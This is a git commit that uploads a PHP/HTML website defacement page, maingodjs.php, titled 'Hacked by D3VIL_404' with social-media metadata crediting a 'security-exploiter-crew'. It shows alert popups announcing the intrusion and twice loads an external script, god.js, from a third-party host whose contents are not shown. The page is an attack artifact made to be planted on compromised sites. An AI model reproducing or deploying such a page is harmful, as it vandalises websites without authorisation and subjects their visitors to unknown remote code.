f1b2601f633e586d56ec198e4406ff55d5b33b0f
d3vil404 <115803213+d3vil404@users.noreply.github.com>
2022-10-16 08:58:16 -0700

    Add files via upload

---
+++ maingodjs.php
@@ -0,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <title>Hacked by  D3VIL_404</title><meta property='og:title' content='D3VIL_404 Was Here'> <meta property='og:description' content='security-exploiter-crew'> 	<meta property='og:image' content='https://www.icegif.com/wp-content/uploads/2022/01/icegif-174.gif'><meta property='og:author' content='D3VIL_404'>
+<script type="text/javascript" src="https://d3vil404.github.io/god.js"></script>
+<script>
+alert('D3VIL_404 was here!!!')
+</script>
+    </head>
+    <body>
+        <script>
+alert('D3VIL_404 was here!!!')
+</script>
+        <script type="text/javascript" src="https://d3vil404.github.io/god.js">
+        </script>
+    </body>
+</html>
